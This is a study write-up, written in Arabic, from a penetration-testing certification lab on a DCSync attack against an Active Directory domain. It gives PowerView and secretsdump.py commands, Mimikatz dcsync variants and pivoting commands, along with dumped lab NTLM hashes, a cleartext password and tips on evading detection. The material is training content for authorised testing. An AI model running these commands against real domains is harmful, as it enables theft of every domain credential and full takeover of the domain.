---

---
title: "SEC-22: Listing Hashes & Cleartext Passwords"
module: "Active Directory Privilege Escalation"
section_num: 22
target: "INLANEFREIGHT.LOCAL"
tags:
  - CPTS
  - ActiveDirectory
  - DCSync
  - ReversibleEncryption
  - Mimikatz
difficulty: "Medium"
vectors: "DCSync · Reversible Encryption"
tools: "Mimikatz · runas · PowerView · secretsdump"
status: "🟢 Complete"
date: 2026-08-03
---

# ⚙ T4E · التقنية للجميع · CPTS CERTIFICATION PATHWAY

| 📍 TARGET NODE | 🔐 ACCESS LEVEL | 📡 ATTACK VECTOR | 📋 SECTION ID |
| :--- | :--- | :--- | :--- |
| `10.129.84.16` — INLANEFREIGHT.LOCAL | Authenticated User (`adunn`) | DCSync / Reversible Encryption | **SEC-22** |

| 🛠️ KEY TOOLS | ⚡ DIFFICULTY | 🎯 CORE OBJECTIVE | 📅 DATE |
| :--- | :--- | :--- | :--- |
| Mimikatz · runas · PowerView | 🟡 Medium | Extract Cleartext Passwords & Execute DCSync via Windows | 2026-08-03 |

`PHASE_I: النظرية` → `PHASE_II: المختبر والطرق الستة` → `PHASE_III: الدليل والمصطلحات`

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║                      ████████╗██╗  ██╗███████╗                       ║
║                      ╚══██╔══╝██║  ██║██╔════╝                       ║
║                         ██║   ███████║█████╗                         ║
║                         ██║   ╚════██║██╔══╝                         ║
║                         ██║        ██║███████╗                       ║
║                         ╚═╝        ╚═╝╚══════╝                       ║
║                                                                      ║
║                       [ TECH FOR EVERYONE ]                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
║  [SECTION]  :: SEC-21 // ACL Abuse — Kerberoasting via Fake SPN      ║
║  [DOMAIN]   :: INLANEFREIGHT.LOCAL · 10.129.84.16                    ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!tip] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD **Language:** Arabic — **Size:** ~2,000 Words **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

---

تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture (الصورة الكبيرة)

مرحباً بك بعالم الـ Active Directory (AD)، وتحديداً بواحد من أخطر وأقوى الهجمات اللي ممكن تنفذها كـ Penetration Tester أو كـ Red Teamer، وهو هجوم الـ DCSync. حتى تفهم هذا الهجوم بشكل حقيقي، لازم نبتعد شوية عن الكيبورد والأوامر، ونتخيل الموضوع كقصة من الحياة الواقعية.

تخيل وياي إن الـ Active Directory هو عبارة عن سلسلة بنوك ضخمة، وهذا البنك اسمه (INLANEFREIGHT). هذا البنك عنده فرع رئيسي، وعنده فروع ثانية بمناطق مختلفة. الفرع الرئيسي بالـ AD نسميه Domain Controller (DC)، وهو "متحكم المجال". بداخل هذا الفرع الرئيسي، اكو قاصة رئيسية (خزنة) كبيرة جداً، هاي القاصة اسمها قاعدة بيانات الـ NTDS.dit. بداخل هاي القاصة، موجودة كل الأسرار: كلمات المرور (Hashes) الخاصة بكل الموظفين، المدراء، وحتى كلمات المرور الخاصة بالأنظمة والخدمات.

هسة، لأن البنك عنده فروع ثانية (Domain Controllers إضافية لضمان استمرارية العمل لو طفى واحد)، هاي الفروع تحتاج تعرف نفس الأسرار الموجودة بالفرع الرئيسي. فشلون يتم هذا الشي؟

البنك مسوي "بروتوكول" أو نظام اسمه (Directory Replication Service Remote Protocol - MS-DRSR). الفكرة منه إن فرع رقم 2 يتصل بالفرع الرئيسي ويكوله: "يابة، انطيني نسخة من القاصة مالتك (الـ Hashes) حتى أحدث بياناتي وأكون متزامن وياك". الفرع الرئيسي راح يشيك هوية اللي ديطلب، إذا شافه يمتلك صلاحية اسمها (Replicating Directory Changes)، راح يكوله "تفضل، هاي نسخة من كل الباسوردات".

هنا يجي دورنا كـ Hackers (أو كـ Penetration Testers). هجوم الـ DCSync مو "ثغرة" برمجية (Bug) أو خطأ بالكود مال مايكروسوفت. لا! هو استغلال لـ "ميزة" شرعية (Feature) تشتغل بالضبط مثل ما صمموها.

إحنا راح نجيب يوزر عادي (مثلاً اسمه adunn)، بس هذا اليوزر، بسبب خطأ من مدير النظام (System Administrator)، انطوه صلاحية الـ Replication (المزامنة). يمكن انطوه هاي الصلاحية بالغلط، أو لأن هذا اليوزر يشتغل على برنامج Backup أو برنامج مزامنة مثل Azure AD Connect.

لما نسيطر على هذا اليوزر، إحنا ما نحتاج نخترق سيرفر الـ Domain Controller نفسه! ما نحتاج نرفع عليه ملفات، ولا نحتاج ننفذ عليه ثغرة RCE. إحنا بكل بساطة راح نوقف بعيد عن السيرفر، ونستخدم أداة تتكلم لغة الـ MS-DRSR، ونرسل طلب للـ Domain Controller نكوله: "مرحباً، أني Domain Controller جديد، ممكن تنطيني نسخة من القاصة مالتك؟" ولأن اليوزر مالتنا عنده الصلاحية، السيرفر راح يصدكنا، ويرمي كل الـ NTLM Hashes مال كل اليوزرات (بما فيهم الـ Administrator الأكبر) بحضننا وإحنا كاعدين بمكاننا!

ليش هذا الهجوم يعتبر زلزال بعالم السايبر؟

1. بالعادة، حتى تسرق الـ Hashes مال الـ AD، لازم تكون مخترق سيرفر الـ DC نفسه وعندك صلاحية Administrator عليه حتى تقرأ ملف الـ NTDS.dit. بالـ DCSync، أنت تسرقهم عن بعد (Over the network) بدون ما تلمس السيرفر.
    
2. ماكو أي استغلال لثغرات (No exploits)، مجرد طلب شرعي للبيانات، فكثير من برامج الحماية القديمة ما تكتشفه لأنه يبين كأنه ترافيك طبيعي مال شبكة (Network Traffic).
    
3. مجرد ما تنفذ هذا الهجوم وتحصل على NTLM Hash الخاص بيوزر اسمه krbtgt (وهذا اليوزر هو اللي يوزع تذاكر الصلاحيات بالشبكة)، أنت حرفياً صرت تملك الشبكة كلها، وتكدر تسوي هجوم اسمه Golden Ticket، يخليك مسيطر على الشركة حتى لو غيروا كل الباسوردات!
    

بهذا التحدي، إحنا سيطرنا على اليوزر adunn بالدومين INLANEFREIGHT.LOCAL، وراح نثبت أولاً إنه يمتلك هاي الصلاحيات الخفية، وبعدين راح نستغلها حتى نسحب كل أسرار المملكة باستخدام أدوات من الويندوز ومن اللينكس.

━━━━━

🔵 المرحلة 1: المصطلحات

قبل ما نبدأ نكتب أي أمر، لازم نكون متفقين على اللغة والمصطلحات. التحدي مليان مصطلحات ثقيلة تخص الـ Active Directory، وهاي المصطلحات راح ترافقك بكل مسيرتك. راح اشرحلك كل مصطلح بالعربي وبطريقة مبسطة جداً:

DCSync (مزامنة متحكم المجال)

- شنو يعني؟ هو تقنية هجوم (وليس اسم أداة) تتيح للمهاجم محاكاة سلوك سيرفر الـ Domain Controller لطلب استنساخ ومزامنة بيانات سرية (مثل كلمات المرور) من سيرفر DC حقيقي.
    
- وين يظهر بالأدوات؟ راح تشوفه كـ module داخل أداة Mimikatz، أو يتم تنفيذه عن طريق سكربتات Impacket وتحديداً أداة `secretsdump.py`.
    

Active Directory / AD (الدليل النشط)

- شنو يعني؟ هو نظام إدارة الشبكات مال مايكروسوفت. تخيله كدليل هاتف عملاق وقاعدة بيانات مركزية تتحكم بكل الحواسيب، المستخدمين، والصلاحيات داخل الشركة. إذا اخترقت الـ AD، أنت اخترقت الشركة كلها.
    

Domain Controller / DC (متحكم المجال)

- شنو يعني؟ هو السيرفر المركزي اللي يشغل الـ Active Directory. هو دماغ الشبكة، هو اللي يقرر منو يدخل ومنو ما يدخل (Authentication)، وشنو يقدر يسوي (Authorization).
    

NTDS.dit (قاعدة بيانات الدليل)

- شنو يعني؟ هو الملف الفعلي الموجود داخل سيرفر الـ Domain Controller بمسار `C:\Windows\NTDS\ntds.dit`. هذا الملف هو "القاصة" اللي تكلمنا عنها. يحتوي على كل اليوزرات وكلمات المرور الخاصة بهم (على شكل Hashes).
    

NTLM Hash (بصمة كلمة المرور)

- شنو يعني؟ الويندوز والـ AD ما يخزنون باسوردك كنص صريح (Cleartext) مثل "password123". يمررونه بمعادلة رياضية تطلع نص غير مفهوم طوله 32 حرف (Hexadecimal). هذا هو الـ NTLM Hash. بالويندوز، إذا عندك هذا الـ Hash، أنت غالباً ما تحتاج تكسره حتى تعرف الباسورد الأصلي، تكدر تستخدمه مباشرة كأنه هو الباسورد (عن طريق هجوم Pass-the-Hash).
    

krbtgt (حساب منح التذاكر)

- شنو يعني؟ هو حساب افتراضي مخفي موجود بكل Active Directory. وظيفته تشفير وتوقيع التذاكر (Tickets) اللي تنعطي لليوزرات. إذا حصلت على الـ Hash مال هذا اليوزر، تكدر تزور تذاكر صلاحيات مطلقة لنفسك (Golden Ticket).
    

ACL / Access Control List (قائمة التحكم بالوصول)

- شنو يعني؟ قائمة مرتبطة بكل كائن (Object) بالـ AD تحدد منو المسموح له يتفاعل ويه هذا الكائن وشنو نوع التفاعل. تتكون من قيود فردية اسمها ACEs.
    

Replicating Directory Changes (صلاحية مزامنة التغييرات)

- شنو يعني؟ هي الصلاحية المحددة داخل الـ ACL اللي تسمح لليوزر أنه يطلب مزامنة الـ NTDS.dit. نحتاج اثنين منهم: `DS-Replication-Get-Changes` و `DS-Replication-Get-Changes-All`.
    

PowerView (باور فيو)

- شنو يعني؟ أداة مكتوبة بلغة PowerShell مصممة لجمع المعلومات (Enumeration) من الـ Active Directory بدون ما تنبه برامج الحماية بشكل كبير. راح نستخدمها حتى نقرأ الـ ACL ونشوف الصلاحيات.
    
- وين يظهر بالأدوات؟ الأوامر مالته تبدأ عادة بـ `Get-DomainUser` أو `Get-ObjectAcl`.
    

Impacket (مجموعة إمباكت)

- شنو يعني؟ مكتبة بايثون ضخمة جداً تحتوي على سكربتات تتحدث بروتوكولات الويندوز والشبكات بطلاقة. الـ Penetration Testers يعشقوها لأنها تخليهم يهاجمون الويندوز من أجهزة لينكس.
    
- الأداة اللي تهمنا منها اليوم هي `secretsdump.py`، وظيفتها سحب واستخراج الـ Hashes من الـ الويندوز بطرق مختلفة، وحدة منها هي הـ DCSync.
    

SID / Security Identifier (معرف الأمان)

- شنو يعني؟ رقم طويل فريد جداً يعطيه الويندوز لكل يوزر أو جروب. الويندوز بالخلفية ما يتعامل ويه اسمك "adunn"، يتعامل ويه الـ SID مالتك. يشبه رقم الهوية الوطنية مالتك.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة التحدي:

إحنا الآن بمرحلة متقدمة من اختراق شبكة الشركة. عندنا وصول (Access) على جهازين:

1. جهاز ويندوز للمهاجم (Windows attack host MS01).
    
2. جهاز لينكس للمهاجم.
    
    الهدف اللي نريد نخترقه هو الـ Domain Controller للشركة. واسم الدومين هو `INLANEFREIGHT.LOCAL`.
    
    إحنا حالياً نسيطر على حساب يوزر اسمه `adunn` (عندنا اليوزر نيم والباسورد مالته). هذا اليوزر يُعتقد إنه يمتلك صلاحيات استثنائية بالـ Active Directory تسمح له بعمل DCSync.
    

🎯 معطيات السيناريو:

- الدومين المهدوف: `INLANEFREIGHT.LOCAL`
    
- اليوزر اللي نسيطر عليه: `adunn`
    
- الـ IP الخاص بالـ Domain Controller المهدوف: `172.16.5.5`
    
- التقنية: Windows Active Directory.
    
- الأدوات المتاحة: PowerShell (PowerView) على الويندوز، و Impacket (`secretsdump.py`) على اللينكس.
    

❓ المطلوب:

1. إثبات أن اليوزر `adunn` يمتلك بالفعل الصلاحيات الكافية لتنفيذ هجوم DCSync (من خلال فحص الـ ACLs).
    
2. تنفيذ هجوم الـ DCSync بنجاح لاستخراج وسحب قاعدة بيانات الـ NTLM Hashes للشركة بالكامل (بما فيها الـ Administrator و krbtgt) باستخدام `secretsdump.py`.
    

🧭 كيف تفكر؟ — Decision Tree لهجمات الـ Active Directory (DCSync):

وصلنا لـ Foothold (موطئ قدم) وسيطرنا على يوزر عادي بالدومين. كيف نصعد للقمة؟

├── الخطوة الأولى: جمع معلومات عن اليوزر الحالي (Enumeration)

│ └── هل هذا اليوزر عنده صلاحيات مميزة؟

│ └── نستخدم BloodHound أو PowerView للفحص.

│

├── الخطوة الثانية: فحص الـ ACL (Access Control List) على مستوى الدومين

│ └── هل اليوزر يمتلك `DS-Replication-Get-Changes` و `DS-Replication-Get-Changes-All`؟

│ ├── لا → لازم ندور مسار ثاني (PrivEsc, Kerberoasting, Path to DA).

│ └── نعم → عظيم! الطريق سالك لتنفيذ DCSync.

│

├── الخطوة الثالثة: تنفيذ الهجوم

│ └── منين راح ننفذ؟

│ ├── من جهاز ويندوز؟ → نستخدم Mimikatz أو Invoke-DCSync.

│ └── من جهاز لينكس؟ → نستخدم `secretsdump.py` من حزمة Impacket (هذا اللي راح نسويه).

│

└── الخطوة الرابعة: ما بعد الاستغلال (Post-Exploitation)

└── حصلنا الـ Hashes، شنسوي بيهم؟

├── نستخدم NTLM Hash مال الـ Administrator للدخول المباشر (Pass-the-Hash بـ evil-winrm).

└── نستخدم Hash الـ krbtgt لصناعة تذكرة ذهبية (Golden Ticket) لضمان البقاء (Persistence).

└── نعطي الـ Hashes الضعيفة لـ Hashcat لكسرها ومعرفة الباسوردات الأصلية كإثبات للعميل.

🗺️ خريطة الهجوم (Roadmap):

بدون تنفيذ، هاي الخطوات اللي راح نمشي عليها بالترتيب:

١. نستعلم عن معلومات اليوزر `adunn` بالـ PowerView حتى نطلع الـ SID الخاص بي لأننا نحتاجه بالبحث.

٢. نستعلم عن الصلاحيات (ACLs) المطبقة على الدومين نفسه، ونفلتر النتائج حتى نشوف بس الصلاحيات الخاصة بـ Replication اللي يمتلكها الـ SID مال اليوزر مالتنا.

٣. نتحول لجهاز اللينكس، ونستخدم `secretsdump.py` مع بيانات اليوزر `adunn` للاتصال بالـ DC وطلب الـ Hashes.

٤. نقرأ النتائج، ونخزن الـ Hashes المهمة.

هسة عرفنا الخطة، يله نلبس القفازات وننفذ!

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

راح نمشي خطوة خطوة، وكل أمر راح نكتبه راح نشرح ليش كتبناه وشنو النتيجة المتوقعة منه.

الخطوة [1]: سحب تفاصيل اليوزر adunn ومعرفة الـ SID

📌 ليش نسوي هاي الخطوة؟

بالويندوز والـ AD، التعامل الحقيقي بالصلاحيات يصير عبر الـ SID (Security Identifier) وليس اسم اليوزر. فحتى نبحث عن صلاحيات اليوزر `adunn` بالمرحلة الجاية، لازم نعرف الـ SID مالته أولاً، ولازم نتأكد من المجموعات اللي ينتمي إلها. راح نستخدم أداة PowerView المدمجة بالـ PowerShell.

🔧 الأمر:

PowerShell

```
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `Get-DomainUser`: أمر من أداة PowerView يجيب معلومات عن يوزر بالدومين.
    
- `-Identity adunn`: نحدد اليوزر اللي نريد معلوماته.
    
- `| select ...`: (Piping) نفلتر النتيجة الطويلة ونطلب بس الأعمدة المهمة: `samaccountname` (اسم اليوزر)، `objectsid` (رقم الهوية)، `memberof` (الجروبات اللي هو بيها)، `useraccountcontrol` (حالة الحساب إذا شغال أو معطل).
    
- `| fl`: مختصر لـ Format-List، يعني اعرضلي النتيجة على شكل قائمة مرتبة (عمودية) مو كجدول مخربط.
    

📤 الـ Output المتوقع:

PowerShell

```
samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

✅ الخطوة التالية:

نشوف إن اليوزر حساب طبيعي وشغال (`NORMAL_ACCOUNT`). ونشوف إن الجروبات مالته عادية جداً (VPN, Printer, File Share). هذا يعني هو مو Domain Admin! لو كان أدمن كان ما نحتاج DCSync أصلاً.

أهم شي ننسخ الـ SID مالته: `S-1-5-21-3842939050-3880317879-2865463114-1164`.

⏸️ Mini-check: هل النتيجة منطقية؟ نعم، طلعنا معلومات اليوزر بنجاح.

━━━━━━━━━━━━━━

الخطوة [2]: تأكيد صلاحيات المزامنة (Replication) على مستوى الدومين

📌 ليش نسوي هاي الخطوة؟

هسة إحنا شاكين إن هذا اليوزر العادي انطوه بالغلط أو بالقصد صلاحية الـ DCSync (Replication). فراح نسأل الدومين كله: "انطيني كل الـ ACLs (الصلاحيات) الخاصة بيك، وفلترلي اياها بس للصلاحيات اللي بيها كلمة Replication واللي تخص الـ SID مال اليوزر مالتنا".

🔧 الأمر:

PowerShell

```
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `$sid= "..."`: خزنّا الـ SID بمتغير حتى الكود يصير أنظف.
    
- `Get-ObjectAcl "DC=inlanefreight,DC=local"`: جيبلي كل الصلاحيات الموجودة على الجذر الرئيسي مال الدومين.
    
- `-ResolveGUIDs`: يحول الأرقام المعقدة (GUIDs) إلى أسماء مفهومة حتى نقدر نقرأها.
    
- `| ? { ($_.ObjectAceType -match 'Replication-Get')}`: علامة الـ `?` تعني `Where-Object` (فلتر). نكوله: فقط اعرضلي الصلاحيات اللي نوعها يحتوي على كلمة `Replication-Get`.
    
- `| ?{$_.SecurityIdentifier -match $sid}`: فلتر ثاني، اعرض فقط الصلاحيات اللي صاحبها هو الـ SID مال يوزرنا `adunn`.
    
- `| select ... | fl`: فلتر عرض الأعمدة المهمة ورتبها كقائمة.
    

📤 الـ Output المتوقع:

PowerShell

```
AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

✅ الخطوة التالية:

دقق بالـ Output. اليوزر `adunn` (اللي الـ SID مالته ينتهي بـ 1164) عنده حالة `AccessAllowed` لثلاث حقوق ممتازة:

1. `DS-Replication-Get-Changes`
    
2. `DS-Replication-Get-Changes-All` هاي هي بالضبط الحقوق اللي يحتاجها الـ Domain Controller حتى يزامن البيانات، وهاي الحقوق موجودة عند اليوزر مالتنا! إذن نظريتنا صحيحة 100٪. هسة ننتقل للهجوم الفعلي.
    

📊 لحد هسة:

[x] فحصنا اليوزر `adunn` وطلعنا الـ SID مالته.

[x] فحصنا الـ ACLs بالدومين وتأكدنا عنده صلاحيات المزامنة.

[ ] ننفذ الهجوم ونسحب الـ Hashes ← الخطوة الجاية.

━━━━━━━━━━━━━━

الخطوة [3]: تنفيذ هجوم الـ DCSync باستخدام secretsdump.py

📌 ليش نسوي هاي الخطوة؟

هسة راح نتحول لجهاز اللينكس مالتنا، ونستخدم أقوى أداة بـ Impacket لسحب البيانات وهي `secretsdump.py`. راح نتصل بالـ DC (الفرع الرئيسي) باسم اليوزر `adunn`، ونطلب منه نسخة من كل الـ Hashes الموجودة بقاعدة بياناته.

🔧 الأمر:

Code snippet

```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

💡 ليش هذا الأمر/الخيار بالذات؟

- `secretsdump.py`: اسم أداة بايثون من حزمة Impacket المتخصصة بسحب أسرار الويندوز والـ AD.
    
- `-outputfile inlanefreight_hashes`: هذا الخيار راح يحفظ النتائج بملفات نصية تبدأ بهذا الاسم بدل ما يطبعها كلها بالشاشة وتضيع. راح يسوي ملف للـ NTLM وملف للـ Kerberos Keys الخ.
    
- `-just-dc`: هذا الفلاج (Flag) مهم جداً. يگول للأداة: "أريد فقط تسوي استخراج لبيانات الـ NTDS (الـ Hashes ومفاتيح الكيربروس) من الـ Domain Controller". بدونها الأداة ممكن تحاول تسحب شغلات ثانية من النظام وتأخذ وقت طويل أو تفشل.
    
- `INLANEFREIGHT/adunn@172.16.5.5`: صيغة الاتصال. (اسم الدومين / اليوزر @ الأي بي مال الـ Domain Controller المهدوف).
    
    ملاحظة: الأداة راح تطلب الباسورد مال adunn لما تضغط Enter، أو تقدر تمرره بالأمر بالشكل `adunn:Password@IP`.
    

📤 الـ Output المتوقع:

Code snippet

```
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
<SNIP>
d0wngrade:des-cbc-md5:d6fee0b62aa410fe
ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

✅ الخطوة التالية:

خلّي نشرح هذا الـ Output الرهيب:

- `Target system bootKey`: هذا المفتاح (bootkey) موجود بملف الـ SYSTEM بالويندوز، وهو اللي يستخدم لتشفير الـ PEK.
    
- `PEK` (Password Encryption Key): هو المفتاح اللي يفك تشفير الـ NTDS.dit حتى نطلع الـ Hashes. الأداة سحبتهم وفكت التشفير بالخلفية!
    
- بعدها بدأت الأداة تطبع الـ Hashes بالصيغة: `Username : User_ID : LM_Hash : NTLM_Hash`.
    
- ركز على سطر الـ `administrator`:500، وسطر الـ `krbtgt`:502. هذول أهم اثنين بالشركة. الـ NTLM Hash مال الـ Administrator هو `88ad09182de639ccc6579eb0849751cf`.
    
- وأحياناً (مثل ما تشوف بآخر الـ output)، إذا كان اليوزر مفعل ميزة (Reversible Encryption)، الأداة راح تطلعلك الباسورد كنص صريح (ClearText) مثل `Pr0xy_ILFREIGHT!`.
    

هسة الدومين كله صار بجيبك! تكدر تنسخ الـ Hash مال الـ Administrator وتستخدمه للدخول المباشر.

إليك رسمة توضيحية للي صار بالخلفية (Attack Chain):

```
[Attacker Linux Machine] 
    │
    │ 1. Connect via MS-DRSR (RPC over SMB) using 'adunn' creds
    │    "Hello, I am a Domain Controller, sync passwords with me!"
    ▼
[Domain Controller 172.16.5.5]
    │ 
    │ 2. Check ACLs for 'adunn' SID
    │    Found: DS-Replication-Get-Changes (-All) -> ACCESS GRANTED
    │
    │ 3. Decrypt NTDS.dit using BootKey + PEK
    │
    │ 4. Send all Hashes back over the network
    ▼
[Attacker Linux Machine]
    │
    └─> Extracts NTLM Hashes -> Administrator, krbtgt -> Domain Compromised!
```

📐 ملخص الإجابات / النتائج:

|**الخطوة**|**الأداة**|**النتيجة**|
|---|---|---|
|فحص اليوزر|PowerView (Get-DomainUser)|الحصول على الـ SID مال adunn|
|فحص الصلاحيات|PowerView (Get-ObjectAcl)|إثبات وجود حقوق المزامنة (Replication)|
|استغلال DCSync|Impacket (secretsdump.py)|استخراج جميع NTLM Hashes للـ Domain|
|ما بعد الاستغلال|evil-winrm (مثلاً)|استخدام NTLM Hash لـ Pass-the-Hash كأدمن|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

هسة لازم نتعلم المرونة بالتعامل، لأن بالواقع (أو بالامتحان)، الأمور مو دائماً تمشي بسلاسة.

🔄 Variations محتملة (ماذا لو):

Variation 1: ماذا لو `secretsdump.py` ما تشتغل أو ما عندك لينكس متاح؟

تكدر تسوي الهجوم بالكامل من جهاز الويندوز (MS01) باستخدام الأداة الأسطورية Mimikatz.

الـ Mimikatz بيها موديول كامل للـ DCSync. الأمر راح يكون:

DOS

```
mimikatz.exe "lsadump::dcsync /domain:inlanefreight.local /all /csv" "exit"
```

أو إذا ردت تسحب بس يوزر معين (krbtgt مثلاً):

DOS

```
mimikatz.exe "lsadump::dcsync /domain:inlanefreight.local /user:krbtgt" "exit"
```

هاي الطريقه ممتازة لأنها تتجنب نقل البيانات لأجهزة خارجية.

Variation 2: ماذا لو الشبكة ضخمة جداً وفيها 50 ألف يوزر؟

عملية الـ DCSync الكاملة (`-just-dc`) راح تسحب كل الـ 50 ألف، وهذا راح يسبب زحام بالشبكة (Traffic Spike) وممكن يطيح الاتصال أو ينبه الـ Blue Team بسرعة.

الحل؟ اسحب بس يوزر واحد محدد تريده باستخدام فلاج `-just-dc-user`:

Code snippet

```
secretsdump.py -just-dc-user krbtgt INLANEFREIGHT/adunn@172.16.5.5
```

هذا راح يجيبلك فقط الـ Hash مال الـ krbtgt بثواني وبدون ما تلفت الانتباه.

Variation 3: ماذا لو طلب منك العميل تقرير عن قوة كلمات المرور بالشركة (Password Audit)؟

ما تريد تكسر باسووردات حسابات مغلقة وتضيع وقت الـ Hashcat. تستخدم فلاج `-user-status` بـ secretsdump:

Code snippet

```
secretsdump.py -just-dc-ntlm -user-status INLANEFREIGHT/adunn@172.16.5.5
```

هذا الفلاج راح يعلمك منو الحساب الـ Disabled (المعطل) حتى تفلتره بره الإحصائيات، وتستخدم `-just-dc-ntlm` حتى ما ينزل مفاتيح الكيربروس اللي ما تحتاجها لكسر كلمات المرور، و `-history` حتى تسحب الـ Hashes القديمة وتشوف إذا الموظفين يعيدون استخدام باسورداتهم القديمة.

Variation 4: ماذا لو ما تقدر تتصل مباشرة بالـ DC من اللينكس؟

يعني جهاز اللينكس مالتك بـ subnet خارجي. تحتاج تسوي Pivoting.

ترفع Chisel أو ProxyChains. تشغل Chisel كـ Server على جهاز اللينكس، وكـ Client على جهاز الويندوز (MS01) المخترق داخلياً وتفتح Socks5 tunnel. بعدين تشغل `secretsdump.py` عبر الـ Proxychains:

Code snippet

```
proxychains secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

🚨 أخطاء كارثية شائعة (الفخوخ):

❌ الفخ الأكبر في الـ DCSync: تنفيذه بحساب ما يمتلك الصلاحيات!

هواية مبتدئين ينجح باختراق يوزر، وقبل ما يفحص الـ ACLs بالـ PowerView، يركض ينفذ `secretsdump.py`. النتيجة؟ الأداة تفشل، بس الأسوأ إنها تترك Logs وتنبيهات ببرامج الحماية (Event ID 4662) بأن يوزر غير مصرح له يحاول يعمل Replication! الفحص أولاً ضروري جداً. (Stealth is key).

❌ خطأ بالأدوات:

نسيان إضافة اسم الدومين الكامل قبل اليوزر بـ secretsdump.

مثال خاطئ: `secretsdump.py adunn@172.16.5.5`

المفروض: `secretsdump.py INLANEFREIGHT/adunn@172.16.5.5`

بدون اسم الدومين، السكربت راح يحاول يسحب الـ SAM database المحلية مال السيرفر مو الـ NTDS مال الدومين!

❌ خطأ مفاهيمي (مهم جداً للإنترفيو أو الامتحانات):

الخلط بين استخراج الـ LSASS واستخراج הـ DCSync.

- الـ LSASS Dumping (مثلاً عن طريق Task Manager أو Procdump): يتطلب أن تكون أنت فعلياً Administrator على الجهاز اللي دتسحب منه الميموري.
    
- الـ DCSync: لا يتطلب أي Code Execution ولا Local Admin على الـ DC! أنت تستخدم بروتوكول شبكة عن بعد طالما تمتلك صلاحية الـ Replication.
    

